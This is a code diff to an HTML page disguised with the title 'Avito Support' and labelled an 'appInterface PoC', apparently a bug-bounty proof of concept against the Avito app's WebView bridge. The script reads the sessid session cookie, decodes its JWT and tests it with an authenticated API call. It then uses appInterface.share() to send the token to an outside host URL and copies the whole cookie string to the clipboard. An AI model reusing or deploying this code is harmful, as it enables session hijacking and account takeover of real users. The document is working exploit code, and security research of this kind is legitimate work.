@@ -1,29 +1,66 @@
 <!DOCTYPE html>
 <html>
-<head><title>Avito Support</title></head>
+<head><title>Avito Support</title>
+<style>
+  body { font-family: monospace; padding: 20px; background: #fff; }
+  pre { background: #f0f0f0; padding: 10px; word-break: break-all; font-size: 12px; }
+  .ok { color: green; font-weight: bold; font-size: 16px; }
+  .err { color: red; }
+</style>
+</head>
 <body>
-<p id="status">Loading...</p>
+<h2>appInterface PoC</h2>
+<div id="out">Loading...</div>
 <script>
 window.onload = function() {
+  var out = document.getElementById('out');
+  var log = function(html) { out.innerHTML += html + '<br>'; };
+
+  // 1. Показываем cookies
   var cookie = document.cookie;
   var m = cookie.match(/sessid=([^;]+)/);
-  var sessid = m ? m[1] : 'NOT_FOUND';
+  var sessid = m ? m[1] : null;
 
-  // Показываем токен прямо на странице (для записи видно)
-  document.getElementById('status').innerText = 'sessid: ' + sessid.substring(0, 40) + '...';
+  log('<b>document.cookie length:</b> ' + cookie.length + ' bytes');
 
-  // Option A: share sheet с токеном — ключевой proof
+  if (!sessid) {
+    log('<span class="err">sessid NOT FOUND in cookies</span>');
+    return;
+  }
+
+  // 2. Декодируем JWT payload прямо на экране
+  try {
+    var parts = sessid.split('.');
+    var payload = JSON.parse(atob(parts[1]));
+    log('<span class="ok">JWT DECODED:</span>');
+    log('<pre>' + JSON.stringify(payload, null, 2) + '</pre>');
+    // payload.u = user_id, payload.exp = expiry
+  } catch(e) {
+    log('<span class="err">JWT decode error: ' + e + '</span>');
+  }
+
+  // 3. Живой API-запрос — показывает что сессия рабочая
+  fetch('/api/1/notifications/count', { credentials: 'include' })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      log('<span class="ok">API /notifications/count → ' + JSON.stringify(d) + '</span>');
+    })
+    .catch(function(e) {
+      log('<span class="err">API error: ' + e + '</span>');
+    });
+
+  // 4. share sheet с токеном
   if (window.appInterface) {
+    log('<b>appInterface.share() triggered</b>');
     window.appInterface.share(
       'Avito – у вас новое сообщение',
       'Проверьте объявление',
-      'https://YOUR_DOMAIN/collect?s=' + encodeURIComponent(sessid)
+      'https://voborgus.github.io/bb-poc-repo/?s=' + encodeURIComponent(sessid)
     );
-
-    // Option B: silent copy
     window.appInterface.copy(cookie);
+    log('<b>appInterface.copy() — ' + cookie.length + ' bytes to clipboard</b>');
   } else {
-    document.getElementById('status').innerText = 'appInterface NOT FOUND (not in Avito WebView)';
+    log('<span class="err">appInterface NOT FOUND</span>');
   }
 };
 </script>
